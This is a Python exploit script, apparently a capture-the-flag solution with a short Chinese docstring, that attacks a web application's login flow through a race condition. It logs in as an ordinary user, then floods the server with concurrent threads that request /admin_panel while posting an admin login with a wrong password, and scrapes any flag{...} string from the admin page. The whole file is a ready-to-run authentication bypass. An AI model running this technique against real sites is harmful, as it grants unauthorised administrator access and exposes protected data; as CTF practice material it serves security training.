import requests, threading, time, re, random, sys

'''
@文件命名：X-088-24
@使用方式: python X-088-24.py url
@简述思路: 利用登录流程条件竞争访问管理员页面，从返回中提取 flag。
'''


def Scan(url):
    bootstrap = requests.Session()
    bootstrap.get(url + "/login", timeout=3)
    bootstrap.post(url + "/login", data={"username":"test","password":"test"}, timeout=3)
    cookie = bootstrap.cookies.get("session")

    sess = requests.Session()
    sess.cookies.set("session", cookie)
    headers = {"Connection": "keep-alive"}

    flag_re = re.compile(r"flag\{[^}]+\}", re.I)
    flag = None
    lock = threading.Lock()

    def race_once(order=0):
        nonlocal flag
        if flag:
            return
        admin_text = None

        def get_admin():
            nonlocal admin_text
            try:
                r = sess.get(url + "/admin_panel", headers=headers, timeout=2)
                admin_text = r.text
            except:
                pass

        def flip_admin():
            try:
                sess.post(url + "/login", headers=headers,
                          data={"username":"admin","password":"x"}, timeout=2)
            except:
                pass

        if order == 0:
            t1 = threading.Thread(target=get_admin)
            t2 = threading.Thread(target=flip_admin)
            t1.start(); time.sleep(0.0005 + random.random()*0.0015); t2.start()
        else:
            t1 = threading.Thread(target=flip_admin)
            t2 = threading.Thread(target=get_admin)
            t1.start(); time.sleep(0.0002 + random.random()*0.0012); t2.start()
        t1.join(); t2.join()

        if admin_text:
            m = flag_re.search(admin_text)
            if m:
                with lock:
                    if not flag:
                        flag = m.group(0)

    for _ in range(20):
        threads = []
        for i in range(20):
            t = threading.Thread(target=race_once, args=(i % 2,))
            t.start(); threads.append(t)
        for t in threads: t.join()
        if flag:
            break

    return flag


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
